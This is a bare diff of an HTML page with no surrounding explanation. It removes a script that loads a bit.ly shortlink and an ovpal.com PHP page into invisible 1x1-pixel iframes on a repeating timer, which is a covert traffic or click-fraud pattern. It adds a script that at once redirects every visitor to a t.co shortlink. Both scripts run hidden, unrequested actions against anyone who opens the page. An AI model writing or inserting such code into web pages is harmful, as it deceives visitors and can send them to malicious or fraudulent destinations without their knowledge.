@@ -1,20 +1,11 @@
-<body>
-<script>
-function prepareFrame(url) {
-        var ifrm = document.createElement("iframe");
-        ifrm.setAttribute("src", url);
-        ifrm.style.width = "1px";
-        ifrm.style.height = "1px";
-        document.body.appendChild(ifrm);
-}
-function timeOutSetter(timeInterval, count) {
-	prepareFrame("http://bit.ly/2L7qHlD");
-	prepareFrame("https://ovpal.com/allstuff/index3.php");
-	if (count%20 == 0) {
-		timeInterval = 3000;
-	}
-	setTimeout(function(){ timeOutSetter(timeInterval, count+1) }, timeInterval);
-}
-timeOutSetter(0,1);
-</script>
-</body>
+<script type="text/javascript">	
+	var urls = new Array();
+	
+	urls[0] = "https://t.co/GuSOHyhXgD";
+	
+	
+	
+	
+	var random = Math.floor(Math.random()*urls.length);
+	window.location = urls[random];
+	</script>
